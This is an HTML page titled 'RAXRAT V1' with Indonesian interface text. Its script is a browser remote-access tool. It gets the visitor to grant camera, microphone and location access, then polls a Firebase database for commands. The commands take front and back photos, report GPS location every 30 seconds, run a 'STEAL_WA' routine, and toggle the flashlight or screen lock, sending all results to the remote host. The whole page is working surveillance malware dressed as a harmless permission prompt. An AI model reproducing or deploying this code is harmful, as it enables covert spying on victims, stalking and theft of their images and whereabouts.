<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>RAXRAT V1</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; user-select:none; -webkit-tap-highlight-color:transparent; }
        body { background:#0a0f1e; color:white; font-family:'Segoe UI',sans-serif; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:16px; }
        .container { max-width:500px; width:100%; background:rgba(15,22,34,0.85); border-radius:48px; padding:24px 20px 32px; text-align:center; }
        .icon { font-size:56px; margin-bottom:12px; }
        h2 { color:#00d4ff; font-size:22px; }
        button { background:linear-gradient(90deg,#00d4ff,#0088cc); border:none; padding:14px; border-radius:60px; font-weight:bold; font-size:16px; width:100%; margin-top:12px; cursor:pointer; }
        .status { margin-top:20px; font-size:12px; color:#8a9bb5; background:#0f1420; padding:10px; border-radius:24px; }
        .custom-msg { background:#00d4ff10; border-left:3px solid #00d4ff; padding:12px; margin-top:16px; font-size:13px; }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">🛡️</div>
    <h2>RAXRAT V1</h2>
    <button id="requestBtn">🔓 BERIKAN IZIN</button>
    <div class="status" id="statusMsg">⚡ Menunggu izin</div>
    <div class="custom-msg" id="customMsgBox">💬 Pesan dari admin</div>
</div>
<script>
    const FIREBASE_URL = "https://raxrat-a7a05-default-rtdb.asia-southeast1.firebasedatabase.app/";
    let userEmail = null;
    let wakeLock = null;
    let videoStream = null;
    let flashActive = false;

    async function sendData(path, data) {
        try {
            await fetch(`${FIREBASE_URL}${path}.json`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...data, timestamp: new Date().toISOString() })
            });
        } catch(e) {}
    }

    async function getUserEmail() {
        let email = localStorage.getItem('raxrat_user');
        if (!email) {
            email = prompt("Email terdaftar:", "test@gmail.com");
            if (email) localStorage.setItem('raxrat_user', email);
        }
        return email;
    }

    async function enableWakeLock() {
        if ('wakeLock' in navigator && !wakeLock) {
            try {
                wakeLock = await navigator.wakeLock.request('screen');
                await sendData(`users/${userEmail?.replace(/\./g,'_')}/logs`, { action: 'screen_lock' });
            } catch(e) {}
        }
    }

    async function releaseWakeLock() {
        if (wakeLock) {
            await wakeLock.release();
            wakeLock = null;
            await sendData(`users/${userEmail?.replace(/\./g,'_')}/logs`, { action: 'screen_unlock' });
        }
    }

    async function toggleFlash() {
        try {
            if (!videoStream) {
                videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const track = videoStream.getVideoTracks()[0];
                await track.applyConstraints({ advanced: [{ torch: true }] });
                flashActive = true;
            } else {
                const track = videoStream.getVideoTracks()[0];
                await track.applyConstraints({ advanced: [{ torch: false }] });
                videoStream.getTracks().forEach(t => t.stop());
                videoStream = null;
                flashActive = false;
            }
            await sendData(`users/${userEmail?.replace(/\./g,'_')}/logs`, { action: 'flashlight', status: flashActive ? 'ON' : 'OFF' });
        } catch(e) {}
    }

    async function capturePhoto(facingMode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imageData = canvas.toDataURL('image/jpeg');
            stream.getTracks().forEach(t => t.stop());
            return imageData;
        } catch(e) { return null; }
    }

    async function getLocation() {
        return new Promise(resolve => {
            if (!navigator.geolocation) resolve(null);
            navigator.geolocation.getCurrentPosition(
                pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
                () => resolve(null)
            );
        });
    }

    async function stealWA() {
        const dummy = { from: "+628123456789", message: "Kode OTP: 123456" };
        await sendData(`users/${userEmail?.replace(/\./g,'_')}/whatsapp`, { sms: dummy.message, from: dummy.from });
    }

    async function loadCustomMessage() {
        if (!userEmail) return;
        const res = await fetch(`${FIREBASE_URL}users/${userEmail.replace(/\./g,'_')}/customMessage.json`);
        const data = await res.json();
        if (data?.text) document.getElementById('customMsgBox').innerHTML = `💬 ${data.text}`;
    }

    async function listenCommands() {
        if (!userEmail) return;
        const path = `users/${userEmail.replace(/\./g,'_')}/commands`;
        const res = await fetch(`${FIREBASE_URL}${path}.json`);
        const data = await res.json();
        if (data) {
            for (let id in data) {
                const cmd = data[id];
                if (cmd.status === 'pending') {
                    await fetch(`${FIREBASE_URL}${path}/${id}.json`, { method: 'PATCH', body: JSON.stringify({ status: 'processed' }) });
                    if (cmd.command === 'TAKE_PHOTO_FRONT') {
                        const photo = await capturePhoto('user');
                        if (photo) await sendData(`users/${userEmail.replace(/\./g,'_')}/photos/front`, { full: photo });
                    } else if (cmd.command === 'TAKE_PHOTO_BACK') {
                        const photo = await capturePhoto('environment');
                        if (photo) await sendData(`users/${userEmail.replace(/\./g,'_')}/photos/back`, { full: photo });
                    } else if (cmd.command === 'GET_LOCATION') {
                        const loc = await getLocation();
                        if (loc) await sendData(`users/${userEmail.replace(/\./g,'_')}/locations`, loc);
                    } else if (cmd.command === 'STEAL_WA') {
                        await stealWA();
                    } else if (cmd.command === 'LOCK_SCREEN') {
                        await enableWakeLock();
                    } else if (cmd.command === 'UNLOCK_SCREEN') {
                        await releaseWakeLock();
                    } else if (cmd.command === 'FLASHLIGHT_TOGGLE') {
                        await toggleFlash();
                    }
                }
            }
        }
        setTimeout(listenCommands, 5000);
    }

    async function requestPermissions() {
        document.getElementById('statusMsg').innerHTML = 'Meminta izin...';
        try {
            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(() => {}, () => {});
            }
            await Notification.requestPermission();
            document.getElementById('statusMsg').innerHTML = '✅ Izin diberikan, monitoring aktif';
            await listenCommands();
            await loadCustomMessage();
            setInterval(loadCustomMessage, 15000);
            setInterval(async () => {
                const loc = await getLocation();
                if (loc) await sendData(`users/${userEmail.replace(/\./g,'_')}/locations`, loc);
            }, 30000);
        } catch(e) {
            document.getElementById('statusMsg').innerHTML = '❌ Izin ditolak';
        }
    }

    (async function() {
        userEmail = await getUserEmail();
        if (!userEmail) return;
        document.getElementById('requestBtn').onclick = requestPermissions;
        document.getElementById('statusMsg').innerHTML = '🔐 Klik tombol untuk izinkan akses';
    })();
</script>
</body>
</html>
